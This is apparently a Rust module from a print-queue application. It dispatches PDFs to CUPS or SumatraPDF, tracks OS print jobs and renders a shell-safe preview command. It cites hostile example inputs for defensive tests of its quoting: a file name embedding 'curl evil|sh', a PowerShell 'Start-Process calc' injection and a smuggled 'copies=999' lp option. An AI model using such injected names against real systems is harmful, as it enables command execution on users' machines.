//! Printer dispatch facade.
//!
//! One printable PDF plus a [`JobSettings`] becomes a real spooler invocation
//! here. The per-backend flag translation lives in [`cups`] (CUPS `lp`, Unix)
//! and [`sumatra`] (SumatraPDF, Windows); this module picks the backend for the
//! current platform and also exposes:
//!
//! - [`preview_command`] — the exact command string shown in the UI's "this is
//!   what we'll run" panel (honesty policy: no hidden flags),
//! - [`check_supported`] — the pure capability gate the dispatcher calls before
//!   spooling,
//! - [`effective_settings`] — the per-input narrowing of the batch settings
//!   (page ranges are a PDF-only concept), and
//! - [`wait_with_timeout`] — the bounded child wait every backend spools
//!   through, so a wedged spooler can never hold the queue forever, and
//! - [`job_state`] / [`cancel_os_job`] — following a spooled job until it
//!   leaves the OS queue, so "done" means the printer finished rather than
//!   "the spooler accepted the file".

use std::borrow::Cow;
use std::path::Path;
use std::process::{Child, ExitStatus};
use std::time::Duration;

use crate::queue::job::{Duplex, JobSettings, PaperSize};

use super::EngineError;

pub mod cups;
pub mod devmode_swap;
pub mod sumatra;
pub mod windows;

/// Result of spooling a job to the OS. `os_job_id` is the spooler's own id when
/// it is known — CUPS's request id (`Office-42`), or on Windows the spooler job
/// id recovered after SumatraPDF hands off — and is what [`job_state`] follows
/// until the job leaves the queue, and what a cancel deletes.
pub struct SpoolOutcome {
    /// The spooler's own job id, when the backend reports one.
    pub os_job_id: Option<String>,
}

/// How the print stage can fail.
///
/// The conversion stage speaks plain [`EngineError`], but printing has two
/// outcomes the dispatcher must treat differently from any other engine
/// failure, so they get their own variants rather than being flattened into
/// [`EngineError::PrintFailed`]:
///
/// - [`PrintError::TimedOut`] is **terminal** (no automatic retry), exactly like
///   the conversion stage's `conversion_timeout` — re-spooling a job that
///   already wedged the spooler once would just wedge it again.
/// - [`PrintError::PrinterMissing`] / [`PrintError::NoPrinter`] are
///   **user-fixable**, so the job is paused for the user to pick a replacement
///   printer (`docs/03-requirements/print-settings.md` §printer,
///   `docs/05-features/printers-management.md` §Missing-printer reconciliation).
///
/// Everything else is an [`EngineError`] carried through unchanged and handled
/// by the ordinary retry policy.
#[derive(Debug, thiserror::Error)]
pub enum PrintError {
    /// The spooler child outlived its wall-clock budget and was killed.
    #[error("printing timed out after {seconds}s")]
    TimedOut {
        /// The budget that was exceeded, in seconds.
        seconds: u64,
    },

    /// The requested printer is not among the queues the OS enumerates.
    #[error("printer '{printer}' is not installed — choose another printer")]
    PrinterMissing {
        /// The printer name the job asked for.
        printer: String,
    },

    /// The requested name matches several OS queues (two queues share a
    /// display name). Never guessed at: the job pauses for a choice.
    #[error("printer name '{printer}' matches several queues ({}) — choose one", candidates.join(", "))]
    PrinterAmbiguous {
        /// The printer name the job asked for.
        printer: String,
        /// The queues that name matches.
        candidates: Vec<String>,
    },

    /// No printer was requested and neither Pluryprint nor the OS has a default.
    #[error("no printer is configured — choose a printer first")]
    NoPrinter,

    /// The job resolved to a printer the user disabled in Pluryprint. Like a
    /// missing printer it is user-fixable, so the job is paused, never sent.
    #[error("printer '{printer}' is disabled in Pluryprint — enable it on the Printers screen or choose another printer")]
    PrinterDisabled {
        /// The disabled printer the job resolved to.
        printer: String,
    },

    /// Any other engine failure, handled by the ordinary retry policy.
    #[error(transparent)]
    Engine(#[from] EngineError),
}

/// What Pluryprint knows about a printer's abilities when it spools to it,
/// read from the OS enumeration ([`crate::ipc::printers::Printer`]).
///
/// Empty lists mean "not reported", never "supports nothing": the platform
/// backends are best effort, and refusing a job because a list could not be
/// read would be worse than letting the spooler decide. [`PrinterCaps::unknown`]
/// is exactly that stance.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PrinterCaps {
    /// Whether the driver can print two-sided.
    pub duplex: bool,
    /// Media names the printer reports (CUPS `PageSize` keywords, Windows paper
    /// names), in its own spelling.
    pub papers: Vec<String>,
    /// CUPS `ColorModel` choices (`Gray`, `RGB`, `CMYK`…); empty on Windows.
    pub color_models: Vec<String>,
}

impl Default for PrinterCaps {
    fn default() -> Self {
        Self::unknown()
    }
}

impl PrinterCaps {
    /// Nothing is known: duplex is trusted (as before enumeration was read)
    /// and no paper or colour model is checked.
    pub fn unknown() -> Self {
        Self {
            duplex: true,
            papers: Vec::new(),
            color_models: Vec::new(),
        }
    }

    /// The printer's own name for `paper`, matched case-insensitively — `A4`
    /// also matches a Windows `A4 210 x 297 mm`, and `letter` a CUPS `Letter`.
    /// `None` when the printer lists no such size (or lists nothing).
    pub fn paper_keyword(&self, paper: &PaperSize) -> Option<&str> {
        let want = paper.as_str();
        self.papers
            .iter()
            .find(|cap| cap.eq_ignore_ascii_case(want))
            .or_else(|| self.papers.iter().find(|cap| paper_prefix_match(cap, want)))
            .map(String::as_str)
    }

    /// Whether `paper` can be sent to this printer: always for `auto` or when
    /// the printer reported no list, otherwise only a size it lists.
    pub fn supports_paper(&self, paper: &PaperSize) -> bool {
        paper.is_auto() || self.papers.is_empty() || self.paper_keyword(paper).is_some()
    }
}

/// `cap` names the size `want` plus a qualifier (`A4 210 x 297 mm`,
/// `A4.Borderless`) — but not a different size that merely starts with the same
/// letters (`LetterSmall`, `A4x`).
fn paper_prefix_match(cap: &str, want: &str) -> bool {
    let (cap_l, want_l) = (cap.to_ascii_lowercase(), want.to_ascii_lowercase());
    match cap_l.strip_prefix(&want_l) {
        Some(rest) => rest
            .chars()
            .next()
            .is_some_and(|c| !c.is_ascii_alphanumeric()),
        None => false,
    }
}

/// Where a spooled job stands in the OS print queue.
///
/// The vocabulary is IPP's `job-state` (RFC 8011 §5.3.7), which CUPS reports
/// directly and the Windows spooler's `JOB_STATUS_*` flags map onto.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OsJobState {
    /// Waiting in the queue (`pending`).
    Pending,
    /// Held: the queue will not print it until someone releases it
    /// (`pending-held`, or a paused Windows job).
    Held,
    /// Being printed (`processing`).
    Processing,
    /// Printing stopped and the device needs attention — out of paper, offline,
    /// a jam (`processing-stopped`, or the Windows error/offline/paper-out
    /// flags). Still in the queue; it resumes when the printer does.
    Stopped,
    /// The printer finished it (`completed`).
    Completed,
    /// Someone cancelled it outside Pluryprint (`canceled`).
    Canceled,
    /// The spooler gave up on it (`aborted`).
    Aborted,
    /// The spooler no longer knows the job. It left the queue; with job
    /// history disabled (or on Windows, where a printed job is removed) that is
    /// the only trace of completion there is.
    Gone,
}

impl OsJobState {
    /// `true` once the job has left the queue for good.
    pub fn is_final(self) -> bool {
        matches!(
            self,
            OsJobState::Completed | OsJobState::Canceled | OsJobState::Aborted | OsJobState::Gone
        )
    }
}

/// Why a job's state could not be read.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum TrackError {
    /// This host cannot answer at all (no `ipptool`/`lpstat`, an id format the
    /// backend does not issue). Asking again will not help, so the caller
    /// stops tracking instead of waiting out the whole print budget.
    #[error("job tracking is not available: {0}")]
    Unavailable(String),
    /// A one-off failure (the scheduler was busy, a transient RPC error); the
    /// next poll may well succeed.
    #[error("could not read the job state: {0}")]
    Transient(String),
}

/// Read where the OS job `os_job_id` (as [`spool`] returned it) stands on
/// `printer`. Never blocks for long: each backend asks the spooler once.
pub fn job_state(printer: &str, os_job_id: &str) -> Result<OsJobState, TrackError> {
    #[cfg(unix)]
    {
        let _ = printer;
        cups::job_state(os_job_id)
    }
    #[cfg(windows)]
    {
        self::windows::job_state(printer, os_job_id)
    }
    #[cfg(not(any(unix, windows)))]
    {
        let _ = (printer, os_job_id);
        Err(TrackError::Unavailable(
            "no print backend is available on this platform".to_string(),
        ))
    }
}

/// Whether a recorded `os_job_id` can still be told apart from another job
/// that later took the same id, so it is safe to follow (or cancel) after the
/// app restarted. CUPS never reuses job ids; the Windows spooler does after a
/// restart, so there the reference must carry the job's submission stamp
/// ([`windows::JobRef`]).
pub fn os_job_id_verifiable(os_job_id: &str) -> bool {
    #[cfg(windows)]
    {
        self::windows::is_verifiable_ref(os_job_id)
    }
    #[cfg(not(windows))]
    {
        !os_job_id.is_empty()
    }
}

/// Best-effort cancellation of the OS job `os_job_id` on `printer`. On
/// Windows it only deletes the job while it is still the one Pluryprint
/// spooled ([`windows::cancel`]).
pub fn cancel_os_job(printer: &str, os_job_id: &str) -> anyhow::Result<()> {
    #[cfg(unix)]
    {
        let _ = printer;
        cups::cancel(os_job_id)
    }
    #[cfg(windows)]
    {
        self::windows::cancel(printer, os_job_id)
    }
    #[cfg(not(any(unix, windows)))]
    {
        let _ = (printer, os_job_id);
        anyhow::bail!("no print backend is available on this platform")
    }
}

/// [`cancel_os_job`] for a job id read back from disk rather than tracked in
/// this process: on Windows the spooler reuses ids, so the job is only
/// deleted while it still has the submission stamp recorded with its id
/// ([`windows::JobRef`]), carries one of `documents` (the names Pluryprint
/// spooled it under) and belongs to this user. CUPS ids are never reused, so
/// there it is a plain cancel.
pub fn cancel_os_job_if_ours(
    printer: &str,
    os_job_id: &str,
    documents: &[String],
) -> anyhow::Result<()> {
    #[cfg(windows)]
    {
        self::windows::cancel_if_ours(printer, os_job_id, documents)
    }
    #[cfg(not(windows))]
    {
        let _ = documents;
        // A job that already left the queue is not something to report as a
        // failed cancel (`cancel` exits non-zero for a completed job).
        if matches!(job_state(printer, os_job_id), Ok(state) if state.is_final()) {
            return Ok(());
        }
        cancel_os_job(printer, os_job_id)
    }
}

/// Spool `pdf` to `printer` with `settings`, tagging the job with `title`.
///
/// Dispatches to CUPS on Unix and SumatraPDF on Windows. On any other platform
/// there is no print backend, so it reports [`EngineError::DependencyMissing`].
/// `timeout` bounds the wait on the spooler child; `None` waits forever.
pub fn spool(
    pdf: &Path,
    printer: &str,
    settings: &JobSettings,
    caps: &PrinterCaps,
    title: &str,
    timeout: Option<Duration>,
) -> Result<SpoolOutcome, PrintError> {
    #[cfg(unix)]
    {
        cups::spool(pdf, printer, settings, caps, title, timeout)
    }
    #[cfg(windows)]
    {
        let _ = caps;
        sumatra::spool(pdf, printer, settings, title, timeout)
    }
    #[cfg(not(any(unix, windows)))]
    {
        let _ = (pdf, printer, settings, caps, title, timeout);
        Err(PrintError::Engine(EngineError::DependencyMissing(
            super::Failure::new(
                "no-print-backend",
                "no print backend is available on this platform",
            ),
        )))
    }
}

/// Wait for `child` for at most `timeout`, killing (and reaping) it when the
/// deadline passes.
///
/// This is the print stage's half of NFR-012 — "a timeout MUST NOT leak
/// processes; orphan children MUST be killed within 5 s" — and the reason the
/// spool path spawns instead of using `Command::output()`: a hung `lp` or
/// SumatraPDF is only one job, but the dispatcher prints one job at a time, so
/// an unbounded wait wedges the whole queue with no way out from the UI.
///
/// `None` disables the bound and waits like a plain `Child::wait`. On timeout
/// the child is killed and waited on (so it cannot linger as a zombie) before
/// [`PrintError::TimedOut`] is returned; a kill that fails is not reported over
/// the timeout itself, which is the fact the caller must act on.
pub fn wait_with_timeout(
    child: &mut Child,
    timeout: Option<Duration>,
) -> Result<ExitStatus, PrintError> {
    use wait_timeout::ChildExt;

    let spawn_failed = |e: std::io::Error| {
        PrintError::Engine(EngineError::PrintFailed(super::Failure::new(
            "wait_failed",
            format!("failed to wait for the print process: {e}"),
        )))
    };

    let Some(timeout) = timeout else {
        return child.wait().map_err(spawn_failed);
    };

    match child.wait_timeout(timeout).map_err(spawn_failed)? {
        Some(status) => Ok(status),
        None => {
            let _ = child.kill();
            let _ = child.wait();
            Err(PrintError::TimedOut {
                seconds: timeout.as_secs(),
            })
        }
    }
}

/// The settings that actually apply to an input with extension `input_ext`.
///
/// Page ranges apply to paged documents: PDFs, and the documents converted to
/// one (Office, OpenDocument, TXT, RTF, HTML, Markdown, XML — the range selects
/// pages of the converted PDF). A picture is rasterised into a single-page PDF,
/// so forwarding a range like `2-3` to the spooler would print nothing at all —
/// a silent empty job. The UI already promises "images ignore the range"
/// (`docs/05-features/print-job.md` §Settings panel), so the engine drops the
/// range for pictures (and for anything it cannot route). The job keeps the
/// range the user typed; only what reaches the spooler is narrowed.
pub fn effective_settings<'a>(settings: &'a JobSettings, input_ext: &str) -> Cow<'a, JobSettings> {
    use crate::engine::convert::{route, Route};
    let paged = matches!(
        route(input_ext),
        Some(
            Route::Passthrough
                | Route::Office
                | Route::Html
                | Route::Markdown
                | Route::Text
                | Route::Xml
        )
    );
    if paged || settings.page_ranges.is_none() {
        return Cow::Borrowed(settings);
    }
    Cow::Owned(JobSettings {
        page_ranges: None,
        ..settings.clone()
    })
}

/// The exact command Pluryprint will run, as a copy-pasteable string for the
/// UI. It uses the same argument builders as [`spool`], so what the user sees is
/// what actually runs — on Windows the SumatraPDF command (written for
/// PowerShell), elsewhere the CUPS `lp` command (written for a POSIX shell).
///
/// Two details that keep "copy-pasteable" true rather than nearly true:
///
/// - every argument a shell would split, expand or interpret is quoted
///   ([`posix_quote`], [`powershell_quote`]), so the pasted line is the same
///   *argument vector* the engine spawns. File names come from the outside
///   world (`x$(curl evil|sh).pdf` is a legal download name), so this is a
///   safety property, not just legibility: pasting the preview must never run
///   anything but the print command; and
/// - a setting the backend cannot express is appended as a `#` comment
///   ([`sumatra::quality_note`]) rather than left unsaid — the panel's job is to
///   tell the user what will happen, including what will not.
///
/// `file_name` is the *input* (what the user added). Like the real dispatch,
/// the preview titles the job with it, and spools the input itself only when
/// it is a PDF; anything else is converted first, so the spooled argument is
/// labelled as that converted PDF rather than shown as the source image.
///
/// The notes are in English; [`preview_command_in`] writes them in the UI's
/// language.
pub fn preview_command(
    file_name: &str,
    printer: &str,
    settings: &JobSettings,
    caps: &PrinterCaps,
) -> String {
    preview_command_in(file_name, printer, settings, caps, "en-US")
}

/// [`preview_command`] with its `#` notes in `locale` (`es-ES`, `en-US`; any
/// other language falls back to English), as the honesty panel shows them.
pub fn preview_command_in(
    file_name: &str,
    printer: &str,
    settings: &JobSettings,
    caps: &PrinterCaps,
    locale: &str,
) -> String {
    let is_pdf = crate::engine::extension_of(std::path::Path::new(file_name)) == "pdf";
    let pdf_display = if is_pdf {
        file_name.to_string()
    } else {
        format!("<converted PDF of {file_name}>")
    };
    #[cfg(windows)]
    {
        let _ = caps;
        // Same resolution and the same argument builder as `sumatra::spool`:
        // the printer's saved default tray shows up here exactly when it will
        // be sent.
        let resolved = sumatra::resolve_for_printer(settings, printer);
        let settings: &JobSettings = &resolved.settings;
        let args = sumatra::sumatra_args(
            printer,
            settings,
            &resolved.ids,
            std::path::Path::new(&pdf_display),
        );
        let cmd = std::iter::once("SumatraPDF.exe")
            .chain(args.iter().map(String::as_str))
            .map(powershell_quote)
            .collect::<Vec<_>>()
            .join(" ");
        let quality = sumatra::quality_support_for(printer, settings);
        std::iter::once(cmd)
            .chain(
                sumatra::preview_notes(settings, &resolved.ids, Some(quality))
                    .iter()
                    .map(|note| note.render(locale)),
            )
            .collect::<Vec<_>>()
            .join("\n")
    }
    #[cfg(not(windows))]
    {
        // CUPS takes every setting as an option: there are no notes.
        let _ = locale;
        // The very builder `spool` uses, so the two cannot drift: same
        // printer, same `-t` title, same options, same order.
        let args = cups::lp_args_for(
            printer,
            std::path::Path::new(&pdf_display),
            settings,
            caps,
            file_name,
        );
        let rendered = args
            .iter()
            .map(|a| posix_quote(a))
            .collect::<Vec<_>>()
            .join(" ");
        format!("lp {rendered}")
    }
}

/// Characters that mean nothing special to a POSIX shell, so a word made only
/// of them is left bare (the common case stays readable). Matches
/// `quoteShellArg` in `src/lib/format.ts`.
fn posix_safe(c: char) -> bool {
    c.is_ascii_alphanumeric()
        || matches!(c, '_' | '-' | '.' | '/' | '=' | ':' | '@' | '%' | '+' | ',')
}

/// Quote `arg` for a POSIX shell so it reaches the program verbatim.
///
/// Single quotes are the only quoting that turns every expansion off (`$`,
/// backticks, `\`, globs, `!`); an inner `'` closes the string, is escaped and
/// reopens it (`'\''`). A newline inside single quotes stays part of the word.
pub fn posix_quote(arg: &str) -> Cow<'_, str> {
    if !arg.is_empty() && arg.chars().all(posix_safe) {
        Cow::Borrowed(arg)
    } else {
        Cow::Owned(format!("'{}'", arg.replace('\'', r"'\''")))
    }
}

/// Every character PowerShell accepts as a single-quote delimiter: the ASCII
/// apostrophe and the typographic U+2018, U+2019, U+201A and U+201B. Escaping
/// only the ASCII one lets `’;Start-Process calc;’` close the string.
const POWERSHELL_QUOTES: [char; 5] = ['\'', '\u{2018}', '\u{2019}', '\u{201A}', '\u{201B}'];

/// Characters that are inert in PowerShell argument mode. Narrower than the
/// POSIX set on purpose: `@` splats, `,` builds an array, `%` and `+` can
/// start expressions.
fn powershell_safe(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.' | '/' | '=' | ':' | '\\')
}

/// Quote `arg` for PowerShell so it reaches the program verbatim.
///
/// A single-quoted string is never expanded (`$env:X`, `$(…)`, backticks are
/// literal). Inside one, each of the five single-quote characters
/// ([`POWERSHELL_QUOTES`]) must be doubled, which is what PowerShell's own
/// `EscapeSingleQuotedStringContent` does.
pub fn powershell_quote(arg: &str) -> Cow<'_, str> {
    if !arg.is_empty() && arg.chars().all(powershell_safe) {
        return Cow::Borrowed(arg);
    }
    let mut out = String::with_capacity(arg.len() + 2);
    out.push('\'');
    for c in arg.chars() {
        if POWERSHELL_QUOTES.contains(&c) {
            out.push(c);
        }
        out.push(c);
    }
    out.push('\'');
    Cow::Owned(out)
}

/// Make `text` safe to put after a `#` comment marker in the preview: a line
/// break (or any control character) in a file name would end the comment and
/// turn the rest of the name into a command, so each becomes `?`.
pub fn comment_text(text: &str) -> String {
    text.chars()
        .map(|c| if c.is_control() { '?' } else { c })
        .collect()
}

/// Fill in what the job leaves to the printer from the per-printer defaults the
/// user set on the Printers screen (`PrinterPrefs::overrides`).
///
/// Precedence is explicit value → printer override → printer default: a job
/// (or profile) that names a tray or a paper size keeps it; one that defers
/// (`tray: None`, paper [`PaperSize::AUTO`]) gets the override; and with no
/// override either, nothing is sent and the printer's own default applies. A
/// blank or unparseable override is ignored rather than sent.
pub fn apply_printer_overrides<'a>(
    settings: &'a JobSettings,
    over: &crate::settings::PrinterOverride,
) -> Cow<'a, JobSettings> {
    let tray = over
        .tray
        .as_deref()
        .map(str::trim)
        .filter(|t| !t.is_empty() && settings.selected_tray().is_none());
    let paper = over
        .paper
        .as_deref()
        .filter(|_| settings.paper_size.is_auto())
        .and_then(|p| PaperSize::parse(p).ok())
        .filter(|p| !p.is_auto());
    if tray.is_none() && paper.is_none() {
        return Cow::Borrowed(settings);
    }
    let mut out = settings.clone();
    if let Some(t) = tray {
        out.tray = Some(t.to_string());
    }
    if let Some(p) = paper {
        out.paper_size = p;
    }
    Cow::Owned(out)
}

/// Pure capability gate: reject settings that would *silently* degrade output.
///
/// Paper is the second such case: a size the printer does not list is
/// substituted by the driver (or rejected by the spooler) with nothing on
/// screen to say so, so it pauses as `unsupported_setting` for the user to pick
/// a size the printer has. Only checked when the printer reported a list.
///
/// Per the honesty policy (`docs/03-requirements/print-settings.md` §160-168)
/// we hard-fail only where the failure is invisible to the user. Duplex is that
/// case: a driver that cannot duplex silently prints single-sided, discovered
/// only at the tray — so a duplex request against a non-duplex printer is an
/// error. Colour is deliberately *not* gated: a colour job on a mono printer
/// prints in grey, which is visible and expected, so `color_supported` is
/// accepted here without complaint.
///
/// Capabilities are passed in (the dispatcher reads them from printer
/// enumeration) to keep this function pure and trivially testable.
pub fn check_supported(
    settings: &JobSettings,
    printer: &str,
    caps: &PrinterCaps,
) -> Result<(), EngineError> {
    // Colour is deliberately not checked: degradation to grey is visible.
    if matches!(settings.duplex, Duplex::Long | Duplex::Short) && !caps.duplex {
        return Err(EngineError::UnsupportedSetting {
            setting: "duplex".to_string(),
            printer: printer.to_string(),
        });
    }
    if !caps.supports_paper(&settings.paper_size) {
        return Err(EngineError::UnsupportedSetting {
            setting: format!("paper size {}", settings.paper_size),
            printer: printer.to_string(),
        });
    }
    // On CUPS a paper or tray name with spaces, quotes or `=` would be split by
    // `lp` into extra job options (`Tray1 copies=999`), so it pauses here as a
    // setting the printer cannot take instead of silently changing the job.
    #[cfg(not(windows))]
    cups::check_option_values(settings, caps).map_err(|e| EngineError::UnsupportedSetting {
        setting: e.to_string(),
        printer: printer.to_string(),
    })?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::queue::job::{Duplex, JobSettings};

    fn caps(duplex: bool, papers: &[&str]) -> PrinterCaps {
        PrinterCaps {
            duplex,
            papers: papers.iter().map(|s| s.to_string()).collect(),
            color_models: Vec::new(),
        }
    }

    #[test]
    fn duplex_requires_driver_support() {
        let settings = JobSettings {
            duplex: Duplex::Long,
            ..JobSettings::default()
        };
        assert!(check_supported(&settings, "P", &caps(false, &[])).is_err());
        assert!(check_supported(&settings, "P", &caps(true, &[])).is_ok());
    }

    #[test]
    fn no_duplex_request_never_fails() {
        let settings = JobSettings::default(); // Duplex::None
        assert!(check_supported(&settings, "P", &caps(false, &[])).is_ok());
    }

    /// On CUPS a tray or paper name that `lp` would split into several options
    /// pauses the job as an unsupported setting instead of reaching the spooler.
    #[cfg(not(windows))]
    #[test]
    fn fr_041_check_supported_refuses_values_lp_would_split() {
        let settings = JobSettings {
            tray: Some("Tray1 copies=999".into()),
            ..JobSettings::default()
        };
        match check_supported(&settings, "Office", &PrinterCaps::unknown()) {
            Err(EngineError::UnsupportedSetting { setting, printer }) => {
                assert!(setting.starts_with("tray "), "{setting}");
                assert_eq!(printer, "Office");
            }
            other => panic!("expected UnsupportedSetting, got {other:?}"),
        }
    }

    #[test]
    fn color_on_mono_printer_is_allowed() {
        // Colour job, printer reports no colour support: prints grey, not an error.
        let settings = JobSettings::default(); // ColorMode::Color
        assert!(check_supported(&settings, "P", &PrinterCaps::unknown()).is_ok());
    }

    /// Any size the printer reports can be chosen, and a size it does not
    /// report pauses the job instead of being silently substituted.
    #[test]
    fn paper_is_validated_against_the_printers_own_list() {
        let printer = caps(true, &["A4", "Letter", "A6", "4x6", "Env10"]);
        let with = |name: &str| JobSettings {
            paper_size: PaperSize::parse(name).unwrap(),
            ..JobSettings::default()
        };
        for ok in ["A4", "letter", "a6", "4x6", "ENV10", "auto"] {
            assert!(check_supported(&with(ok), "P", &printer).is_ok(), "{ok}");
        }
        match check_supported(&with("A3"), "Photo", &printer) {
            Err(EngineError::UnsupportedSetting { setting, printer }) => {
                assert!(setting.contains("A3"), "{setting}");
                assert_eq!(printer, "Photo");
            }
            other => panic!("expected UnsupportedSetting, got {other:?}"),
        }
        // Nothing reported → nothing refused.
        assert!(check_supported(&with("Tabloid"), "P", &PrinterCaps::unknown()).is_ok());
    }

    /// Job/profile values win over the printer's overrides, which win over the
    /// printer's own defaults (nothing sent).
    #[test]
    fn printer_overrides_fill_only_what_the_job_leaves_open() {
        use crate::settings::PrinterOverride;
        let over = PrinterOverride {
            tray: Some("Tray 2".into()),
            paper: Some("Letter".into()),
        };

        // The job defers on both: the overrides apply.
        let open = JobSettings {
            paper_size: PaperSize::AUTO,
            tray: None,
            ..JobSettings::default()
        };
        let got = apply_printer_overrides(&open, &over);
        assert_eq!(got.tray.as_deref(), Some("Tray 2"));
        assert_eq!(got.paper_size, PaperSize::LETTER);

        // Explicit values win.
        let explicit = JobSettings {
            paper_size: PaperSize::A3,
            tray: Some("Manual".into()),
            ..JobSettings::default()
        };
        let got = apply_printer_overrides(&explicit, &over);
        assert_eq!(got.tray.as_deref(), Some("Manual"));
        assert_eq!(got.paper_size, PaperSize::A3);
        assert!(matches!(got, Cow::Borrowed(_)), "nothing to fill in");

        // No override: still deferring, so nothing is sent at all.
        let got = apply_printer_overrides(&open, &PrinterOverride::default());
        assert!(got.paper_size.is_auto());
        assert!(got.tray.is_none());

        // A blank override is not an override.
        let blank = PrinterOverride {
            tray: Some("  ".into()),
            paper: Some(String::new()),
        };
        let got = apply_printer_overrides(&open, &blank);
        assert!(got.tray.is_none() && got.paper_size.is_auto());
    }

    #[test]
    fn paper_keyword_uses_the_printers_spelling() {
        let win = caps(true, &["Letter", "LetterSmall", "A4 210 x 297 mm"]);
        assert_eq!(win.paper_keyword(&PaperSize::A4), Some("A4 210 x 297 mm"));
        assert_eq!(win.paper_keyword(&PaperSize::LETTER), Some("Letter"));
        assert_eq!(
            win.paper_keyword(&PaperSize::parse("lettersmall").unwrap()),
            Some("LetterSmall")
        );
        assert_eq!(win.paper_keyword(&PaperSize::LEGAL), None);
        // A longer size name is not a qualifier of a shorter one.
        assert_eq!(caps(true, &["A4x"]).paper_keyword(&PaperSize::A4), None);
    }

    #[test]
    fn unsupported_setting_names_duplex_and_printer() {
        let settings = JobSettings {
            duplex: Duplex::Short,
            ..JobSettings::default()
        };
        match check_supported(&settings, "Front Desk", &caps(false, &[])) {
            Err(EngineError::UnsupportedSetting { setting, printer }) => {
                assert_eq!(setting, "duplex");
                assert_eq!(printer, "Front Desk");
            }
            other => panic!("expected UnsupportedSetting, got {other:?}"),
        }
    }

    #[test]
    fn fr_040_page_range_is_dropped_for_image_inputs() {
        // The UI promises "images ignore the range"; an image becomes a
        // one-page PDF, so a range that excludes page 1 would spool nothing.
        let settings = JobSettings {
            page_ranges: Some("2-3".to_string()),
            ..JobSettings::default()
        };

        let pdf = effective_settings(&settings, "pdf");
        assert_eq!(pdf.page_ranges.as_deref(), Some("2-3"), "PDFs keep it");

        // Converted documents are paged: the range selects pages of their PDF.
        for ext in ["docx", "ODT", "txt", "html", "md", "xml"] {
            let doc = effective_settings(&settings, ext);
            assert_eq!(doc.page_ranges.as_deref(), Some("2-3"), "{ext} keeps it");
        }

        for ext in ["png", "JPG", "tiff", "webp", "heic", ""] {
            let img = effective_settings(&settings, ext);
            assert!(img.page_ranges.is_none(), "{ext} must drop the range");
            // Nothing else is narrowed.
            assert_eq!(img.copies, settings.copies);
            assert_eq!(img.paper_size, settings.paper_size);
        }

        // An image job without a range borrows the original — no needless clone.
        let plain = JobSettings::default();
        assert!(matches!(
            effective_settings(&plain, "png"),
            std::borrow::Cow::Borrowed(_)
        ));
    }

    #[test]
    fn fr_040_image_lp_args_carry_no_page_ranges() {
        // End-to-end through the flag builder: what reaches `lp` for an image
        // must not contain `page-ranges`.
        let settings = JobSettings {
            page_ranges: Some("2-3".to_string()),
            ..JobSettings::default()
        };
        let opts = cups::lp_opts(&effective_settings(&settings, "png"));
        assert!(
            !opts.iter().any(|o| o.starts_with("page-ranges=")),
            "image job must not be page-ranged: {opts:?}"
        );
        let opts = cups::lp_opts(&effective_settings(&settings, "pdf"));
        assert!(opts.iter().any(|o| o == "page-ranges=2-3"));
    }

    #[test]
    fn preview_command_shows_printer_and_pdf() {
        let settings = JobSettings::default();
        let cmd = preview_command("/tmp/job.pdf", "Office", &settings, &PrinterCaps::unknown());
        assert!(
            cmd.contains("/tmp/job.pdf"),
            "preview names the file: {cmd}"
        );
        assert!(cmd.contains("Office"), "preview names the printer: {cmd}");
    }

    /// The preview is the argument vector `lp` really receives: the job title
    /// (`-t <file name>`) included, and for an image the PDF it is converted
    /// to — never the source image, which is not what gets spooled.
    #[test]
    fn preview_matches_the_spooled_argument_vector() {
        let settings = JobSettings::default();
        let pdf = preview_command("report.pdf", "Office", &settings, &PrinterCaps::unknown());
        let img = preview_command("chart.png", "Office", &settings, &PrinterCaps::unknown());
        if cfg!(windows) {
            assert!(img.contains("<converted PDF of chart.png>"), "{img}");
        } else {
            assert!(pdf.starts_with("lp -d Office -t report.pdf "), "{pdf}");
            assert!(pdf.ends_with(" report.pdf"), "{pdf}");
            assert!(img.contains("-t chart.png"), "{img}");
            assert!(
                img.ends_with(" '<converted PDF of chart.png>'"),
                "an image spools its converted PDF: {img}"
            );
        }
    }

    #[test]
    fn posix_quote_leaves_plain_words_bare_and_single_quotes_the_rest() {
        assert_eq!(posix_quote("media=A4"), "media=A4");
        assert!(matches!(posix_quote("-o"), Cow::Borrowed(_)));
        assert_eq!(posix_quote("InputSlot=Tray 2"), "'InputSlot=Tray 2'");
        assert_eq!(posix_quote(""), "''");
        assert_eq!(posix_quote("Bob's.pdf"), r"'Bob'\''s.pdf'");
    }

    /// Reproduces the preview through a real POSIX shell: whatever the file
    /// name, the pasted line hands `printf` back exactly the original words
    /// and runs nothing else.
    #[cfg(unix)]
    #[test]
    fn posix_quote_neutralises_command_substitution_in_a_real_shell() {
        let dir = tempfile::tempdir().unwrap();
        let canary = dir.path().join("pwned");
        let c = canary.display();
        let names = [
            format!("x$(touch {c}).pdf"),
            format!("a `touch {c}`.pdf"),
            format!("a $(touch {c}) b.pdf"),
            format!("q'$(touch {c})'.pdf"),
            format!("d\"$(touch {c})\".pdf"),
            "back\\slash $HOME !x *.pdf".to_string(),
            format!("line\n$(touch {c})"),
        ];
        for name in &names {
            let line = format!("printf '%s\\0' {}", posix_quote(name));
            let out = std::process::Command::new("sh")
                .arg("-c")
                .arg(&line)
                .output()
                .unwrap();
            assert!(out.status.success(), "{line}");
            assert_eq!(out.stdout, format!("{name}\0").into_bytes(), "{line}");
            assert!(!canary.exists(), "pasting {line:?} ran a command");
        }
    }

    /// PowerShell treats U+2018/2019/201A/201B as single quotes too, so every
    /// one of them is doubled, not only the ASCII apostrophe.
    #[test]
    fn powershell_quote_doubles_every_single_quote_character() {
        assert_eq!(powershell_quote("-print-to"), "-print-to");
        assert_eq!(powershell_quote(r"C:\Docs\a.pdf"), r"C:\Docs\a.pdf");
        assert_eq!(powershell_quote("Office 2"), "'Office 2'");
        assert_eq!(powershell_quote(""), "''");
        assert_eq!(powershell_quote("Bob's"), "'Bob''s'");
        assert_eq!(
            powershell_quote("a\u{2019};Start-Process calc;\u{2019}"),
            "'a\u{2019}\u{2019};Start-Process calc;\u{2019}\u{2019}'"
        );
        for q in ['\u{2018}', '\u{2019}', '\u{201A}', '\u{201B}'] {
            assert_eq!(powershell_quote(&q.to_string()), format!("'{q}{q}'"));
        }
        // Expansion and splatting characters force quotes.
